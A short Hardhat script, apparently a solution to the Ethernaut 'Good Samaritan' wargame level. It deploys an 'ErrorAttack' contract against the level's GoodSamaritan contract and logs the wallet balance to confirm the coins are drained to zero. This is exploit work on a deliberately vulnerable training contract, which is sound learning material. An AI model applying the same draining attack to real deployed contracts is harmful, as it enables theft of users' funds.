const { ethers } = require("hardhat");
const Runner = require("./lib/runner");
const utils = require("./lib/utils");

Runner.run(async (provider, owner) => { 
    
    //PLACE THE GOOD SAMARITAN CONTRACT ADDRESS HERE (Ethernaut: contract.address) 
    const contractAddr = "0x4c0527dA9802c121cc74A322578B3F73138C056C"; 
    
    //get the small network of contracts: GoodSamaritan -> Wallet -> and Coin 
    const contract = await ethers.getContractAt("GoodSamaritan", contractAddr);
    const wallet = await ethers.getContractAt("Wallet", await contract.wallet());
    const coin = await ethers.getContractAt("Coin", await wallet.coin()); 

    console.log("* * * ");

    //initial balance should be a high positive value 
    console.log(`initial balance is ${await coin.balances(wallet.address)}`); 
    
    //deploy the attack 
    const attacker = await utils.deployContractSilent("ErrorAttack");
    await attacker.attack(contract.address, true); 
    
    //now it should be zero. If it's not immediately, don't worry; recheck again in a minute
    console.log(`balance is now ${await coin.balances(wallet.address)}`); 
});
